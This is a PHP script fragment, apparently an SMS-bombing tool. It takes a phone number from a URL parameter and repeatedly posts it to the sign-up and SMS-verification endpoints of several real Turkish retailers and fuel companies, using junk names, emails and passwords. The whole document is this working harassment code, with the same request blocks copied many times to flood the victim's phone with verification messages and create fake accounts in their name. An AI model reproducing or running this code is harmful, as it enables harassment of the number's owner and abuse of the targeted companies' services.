$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardNo=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$telno&opetKvkkAndEtk=true&plate=24LSF2022");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$telno&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$telno&token_type=register_token");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGiftelnolubCustomerConfirmationSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$telno&page=Login");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$telno");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=ahmet&last_name=kaya&email=nudaudwasasdsdas@gmail.com&phone=0$telno&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardNo=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$telno&opetKvkkAndEtk=true&plate=24LSF2022");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$telno&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$telno&token_type=register_token");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGiftelnolubCustomerConfirmationSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$telno&page=Login");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$telno");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=ahmet&last_name=kaya&email=nudaudwasasdsdas@gmail.com&phone=0$telno&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardNo=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$telno&plate=24LSF2022");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://ipapp.ipragaz.com.tr/login/register");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"name=ahmet kaya&phone=$telno&day=18&month=1&year=1980&carPlate=24     LSF     2022&savePersonalData=true");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$telno&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$telno&token_type=register_token");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGiftelnolubCustomerConfirmationSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$telno&page=Login");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$telno");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=ahmet&last_name=kaya&email=nudaudwasasdsdas@gmail.com&phone=0$telno&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardNo=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$telno&opetKvkkAndEtk=true&plate=24LSF2022");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$telno&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$telno&token_type=register_token");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGiftelnolubCustomerConfirmationSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$telno&page=Login");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$telno");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=ahmet&last_name=kaya&email=nudaudwasasdsdas@gmail.com&phone=0$telno&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardNo=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$telno&opetKvkkAndEtk=true&plate=24LSF2022");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$telno&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$telno&token_type=register_token");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGiftelnolubCustomerConfirmationSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$telno&page=Login");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$telno");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=ahmet&last_name=kaya&email=nudaudwasasdsdas@gmail.com&phone=0$telno&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardNo=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$telno&opetKvkkAndEtk=true&plate=24LSF2022");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$telno&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$telno&token_type=register_token");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGiftelnolubCustomerConfirmationSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$telno&page=Login");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$telno");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=ahmet&last_name=kaya&email=nudaudwasasdsdas@gmail.com&phone=0$telno&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardNo=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$telno&plate=24LSF2022");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://ipapp.ipragaz.com.tr/login/register");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"name=ahmet kaya&phone=$telno&day=18&month=1&year=1980&carPlate=24     LSF     2022&savePersonalData=true");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$telno&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$telno&token_type=register_token");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGiftelnolubCustomerConfirmationSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$telno&page=Login");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$telno");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=ahmet&last_name=kaya&email=nudaudwasasdsdas@gmail.com&phone=0$telno&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardNo=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$telno&opetKvkkAndEtk=true&plate=24LSF2022");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$telno&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$telno&token_type=register_token");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGiftelnolubCustomerConfirmationSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$telno&page=Login");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$telno");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=ahmet&last_name=kaya&email=nudaudwasasdsdas@gmail.com&phone=0$telno&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardNo=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$telno&opetKvkkAndEtk=true&plate=24LSF2022");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$telno&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$telno&token_type=register_token");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGiftelnolubCustomerConfirmationSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$telno&page=Login");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
 
 
 
$telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$telno");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
        $telno=$_GET['telno'];
$ch = curl_init();
 

curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=ahmet&last_name=kaya&email=nudaudwasasdsdas@gmail.com&phone=0$telno&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
// Receive server response ...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 

$server_output = curl_exec($ch);
 

curl_close ($ch);
echo $server_output;
 
 
 
